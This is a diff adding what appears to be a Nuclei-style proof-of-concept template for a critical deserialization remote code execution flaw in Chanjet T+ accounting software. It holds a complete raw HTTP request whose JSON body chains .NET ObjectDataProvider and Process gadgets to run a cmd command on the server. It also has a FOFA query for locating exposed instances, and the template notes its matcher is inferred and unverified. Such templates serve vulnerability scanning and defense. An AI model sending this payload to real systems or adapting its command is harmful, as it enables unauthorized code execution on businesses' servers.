@@ -1,0 +1,21 @@
+id: poc-3165046bc8f4c47c157d
+info:
+  name: 用友畅捷通TPlusUfida.T.DI.UIP.net反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3165046bc8f4c47c157d5a232664f1dd
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 3165046bc8f4c47c157d5a232664f1dd
+    fofa: + hunnter`app.name="畅捷通 T+"`
+http:
+- raw:
+  - "POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36\nContent-Length: 601\nConnection: close\nContent-Type: application/json\nAccept-Encoding: gzip, deflate, br\n\n{\n  \"storeID\": {\n    \"__type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n    \"MethodName\": \"Start\",\n    \"ObjectInstance\": {\n      \"__type\": \"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n      \"StartInfo\": {\n        \"__type\": \"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n        \"FileName\": \"cmd\",\n        \"Arguments\": \"/c echo baidubaidu > baidu.txt\"\n      }\n    }\n  }\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
